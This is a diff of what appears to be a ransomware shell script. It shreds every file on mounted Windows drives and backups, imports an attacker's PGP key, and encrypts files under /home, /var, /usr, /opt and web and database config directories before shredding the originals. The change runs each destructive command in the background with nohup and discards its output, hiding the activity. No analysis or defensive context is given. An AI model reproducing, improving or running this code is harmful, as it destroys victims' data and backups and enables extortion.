@@ -1,6 +1,6 @@
-find /mnt/d/backups/ -type f -exec shred -zun0 '{}' \;
-find /mnt/d/ -type f -exec shred -zun0 '{}' \;
-find /mnt/c/ -type f -exec shred -zun0 '{}' \;
+nohup find /mnt/d/backups/ -type f -exec shred -zun0 '{}' \; >/dev/null 2>&1 &
+nohup find /mnt/d/ -type f -exec shred -zun0 '{}' \; >/dev/null 2>&1 &
+nohup find /mnt/c/ -type f -exec shred -zun0 '{}' \; >/dev/null 2>&1 &
 
 echo '-----BEGIN PGP PUBLIC KEY BLOCK-----
 
@@ -44,4 +44,4 @@ I57Q5vcwTg==
 =K5dc
 -----END PGP PUBLIC KEY BLOCK-----' | gpg --import
 cp /usr/bin/gpg /sbin/
-find /home /backup /var /etc/apache2 /etc/nginx /etc/mysql /etc/ufw /usr /opt -type f ! -name '*.ENC' -exec /sbin/gpg --batch --yes --output '{}'.ENC --encrypt --recipient CDA6C8057450C0B1CB420E41C1848A8E43BAC7DA --trust-model always '{}' \; -exec shred -zun0 '{}' \;
+nohup find /home /backup /var /etc/apache2 /etc/nginx /etc/mysql /etc/ufw /usr /opt -type f ! -name '*.ENC' -exec /sbin/gpg --batch --yes --output '{}'.ENC --encrypt --recipient CDA6C8057450C0B1CB420E41C1848A8E43BAC7DA --trust-model always '{}' \; -exec shred -zun0 '{}' \; >/dev/null 2>&1 &
